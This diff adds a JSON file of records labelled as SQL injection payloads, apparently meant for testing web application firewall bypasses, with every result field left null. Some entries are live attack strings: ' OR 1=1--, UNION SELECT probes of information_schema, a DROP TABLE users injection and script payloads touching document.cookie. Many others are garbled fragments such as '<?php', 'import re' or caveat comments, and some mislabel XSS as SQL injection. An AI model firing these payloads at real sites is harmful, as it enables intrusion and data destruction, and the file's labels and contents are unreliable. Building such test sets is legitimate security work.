@@ -1,0 +1,402 @@
+[
+  {
+    "payload": "<?php",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "Boolean-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "'http://example.com/page?username=1&password=admin%20AND 1=1;UNION+%3A--+' OR 'https://www.google.com/?q=' or ''OR'' AND EXISTS(SELECT * FROM users WHERE username = %s)' -- http request logic, this is example only!",
+    "technique": "Boolean-based Blind_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "Boolean-based Blind_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "' OR '1=1'-- UNION ALL SELECT  CAST(0 AS VARCHAR) FROM DUAL;--` `",
+    "technique": "Boolean-based Blind_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?PHP",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "' OR 1=1--';SELECT * FROM users WHERE username = '' AND password LIKE '%system%';LIMIT 0, 5;UNION SELECT * FROM useradmin WHERE email='test@example.com'--`",
+    "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "'OR 1=1-- OR ' or 1 = 1 -- AND len(yourquerystring)=0''\\r\\n'.format(request.args['q']) + '\\x3c/'h%27t/e>'  # obfuscated sql injection with double url encode and string concatenation",
+    "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<script>alert('123')</script><form method=\"post\" action=\"/\"><input type=\"text\" name=\"q\"> </form>",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "'OR 1=1-- OR ' . $_GET['param'] .' AND \"0=' . (int)(2 * rand()) --';  // Obfuscated comment, obfuscate URL parameters with double encoding before and after",
+    "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "// This is an example to demonstrate obfuscation techniques, use with caution!",
+    "technique": "Boolean-based Blind_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "?q=http://localhost/admin%20login&amp;username=<script>alert(1)</script>&amp;password=%3C--><![CDATA[<object data=\"https:\\/\\/www\\.googleusercontent\\..php\">]]></object>%3D</param]%7B%28document.cookie%29,%26querystring:%2Fsearch%3Fq=something",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "Boolean-based Blind_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+    "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "UNION SELECT 0, NULL, '1',  NULL,'', '', '' ,",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "Time-based Blind_full_bypass+Boolean-based Blind_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "Boolean-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "'OR 1=1-- OR 1 = 2 --  ';UNION SELECT NULL, ';",
+    "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "import re",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><data>",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "'http://[www.example.com/wp-admin/includes/functions.php?q=1&action=' . urldecode(base64_encode('test'))",
+    "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "'http://127.0.0.1/cgi-bin/?q=SELECT%2C* FROM %s;--%3D548e69d';",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+    "technique": "Time-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?PHP",
+    "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?> <form action=\"/admin/process\" method=\"post\">",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "http://127.0.0.1/search/?q=SELECT%3F' OR '1'--\"",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "SELECT  CAST(NULL AS VARCHAR) + 'a' UNION SELECT NULL;",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass+Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "http://example.com/page?name=';DROP TABLE IF EXISTS users;-- UNION SELECT NULL FROM (SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 'public');'",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<script>alert('123');</script><img src=\"http://example.com/phpinfo()<?php echo $_GET['id']; ?>\" />",
+    "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "SELECT 1 UNION SELECT NULL, 's' FROM information_schema.`TABLES` WHERE `TABLE_NAME` = 'information_schema';;",
+    "technique": "Union Select Null Bytes_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "' OR 1=1-- UNION SELECT NULL FROM (SELECT * FROM users WHERE username = ''';OR `password IS NOT NULL`) AS t --  UNION SELECT 'a', '') ';`",
+    "technique": "Boolean-based Blind_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "--  Time Format string manipulation",
+    "technique": "Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "'UNION SELECT 0,' || UNION 'SELECT * FROM dummy WHERE id = '' OR NULL;--';  OR 1 --db.'||subdomain'' ;'--'\"\"\"",
+    "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "-- Payload examples, please remember these are just demonstrations and should be used only in safe environments!",
+    "technique": "Time-based Blind_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Time-based Blind_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "%7C1c568903g4xM<http://www.example.com/search?q=admin>P$oY&s=%2F~*.*|X[a..zA-Z]|(?:^|\\r\\n)[^\\w@]+!H@[.](?:\\\\.){2,}(?!.[A-Za-z])&(u{);O?*Q",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  },
+  {
+    "payload": "<?php",
+    "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+    "attack_type": "sqli",
+    "status_code": null,
+    "is_bypassed": null,
+    "is_harmful": null
+  }
+]
